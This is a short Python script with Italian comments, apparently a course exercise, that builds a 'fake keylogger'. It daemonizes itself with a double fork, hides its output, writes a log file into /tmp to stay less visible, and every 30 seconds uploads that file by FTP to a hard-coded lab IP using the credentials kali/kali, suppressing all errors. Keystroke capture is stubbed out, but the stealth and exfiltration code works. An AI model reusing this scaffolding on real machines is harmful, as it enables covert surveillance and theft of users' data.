import os
import sys
import datetime
import time
from ftplib import FTP

# --- CONFIGURAZIONE ---
VM_IP = "172.29.82.216"  # IP della tua VM Ubuntu
FTP_USER = "kali"
FTP_PASS = "kali"
LOG_FILE = "/tmp/hidden_log.txt" # Usiamo /tmp per essere meno visibili

def daemonize():
    """Sposta l'esecuzione dello script in background (Double Fork)"""
    try:
        pid = os.fork()
        if pid > 0:
            # Primo fork: esce dal processo padre
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Fork 1 fallito: {e}\n")
        sys.exit(1)

    os.chdir("/") # Sgancia dalla directory corrente
    os.setsid()   # Diventa leader di sessione
    os.umask(0)   # Resetta i permessi dei file creati

    try:
        pid = os.fork()
        if pid > 0:
            # Secondo fork: esce dal primo figlio
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Fork 2 fallito: {e}\n")
        sys.exit(1)

    # Chiude i canali standard (Input/Output/Error) per non lasciare tracce nel terminale
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'rb') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'ab') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def invia_file_ftp():
    try:
        with FTP(VM_IP) as ftp:
            ftp.login(user=FTP_USER, passwd=FTP_PASS)
            with open(LOG_FILE, "rb") as f:
                ftp.storbinary(f"STOR remote_log.txt", f)
    except:
        pass # In background non vogliamo errori visibili

def fake_keylogger():
    """Logica del prof adattata per girare in loop silenzioso"""
    while True:
        # In una simulazione reale in background, qui cattureresti i tasti.
        # Per l'esercizio del prof, scriviamo un log ogni 30 secondi.
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Heartbeat: Keylogger attivo in background.\n"
        
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
        
        invia_file_ftp()
        time.sleep(30) # Invia i dati ogni 30 secondi

if __name__ == "__main__":
    print("[+] Lancio del keylogger in background...")
    daemonize()
    # Da qui in poi, lo script è invisibile al terminale
    fake_keylogger()